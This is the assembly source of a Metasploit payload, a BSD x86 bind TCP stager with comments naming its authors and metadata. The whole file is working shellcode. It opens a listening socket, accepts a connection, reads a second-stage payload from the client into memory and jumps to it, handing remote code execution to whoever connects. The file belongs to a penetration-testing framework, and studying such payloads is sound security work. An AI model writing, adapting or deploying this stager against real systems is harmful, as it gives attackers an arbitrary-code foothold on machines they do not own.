;;
; 
;        Name: stager_sock_bind
;   Qualities: Can Have Nulls
;     Version: $Revision: 1628 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a BSD portbind TCP stager.
;
; Meta-Information:
;
; meta-shortname=BSD Bind TCP Stager
; meta-description=Listen on a port for a connection and run a second stage
; meta-authors=skape <mmiller [at] hick.org>, vlad902 <vlad902 [at] gmail.com>
; meta-os=bsd
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=bind
; meta-name=bind_tcp
; meta-basemod=Msf::PayloadComponent::BindConnection
; meta-offset-lport=0x8
;;
BITS   32
GLOBAL main

main:

socket:
	push byte 97
	pop  eax
	cdq
	push edx
	push dword 0xbfbf0210
	mov  ecx, esp

	push edx
	inc  edx
	push edx
	inc  edx
	push edx
	push byte 0x10
	int  0x80
	cdq
	xchg eax, ebx

bind:
	push ecx
	push ebx
	push edx
	push byte 104
	pop  eax
	int  0x80

listen:
	mov  al, 106
	int  0x80

accept:
	push edx
	push ebx
%ifndef USE_SINGLE_STAGE
	mov  dh, 0x10
%endif
	push edx
	mov  al, 30
	int  0x80

%ifndef USE_SINGLE_STAGE

read:
	push ecx
	push eax
	push ecx
%ifdef FD_REG_EBX
	xchg eax, ebx
%else
	xchg eax, edi
%endif
	push byte 0x3
	pop  eax
	int  0x80
	ret

%else

%ifdef FD_REG_EBX
	xchg eax, ebx
%else
	xchg eax, edi
%endif

%endif
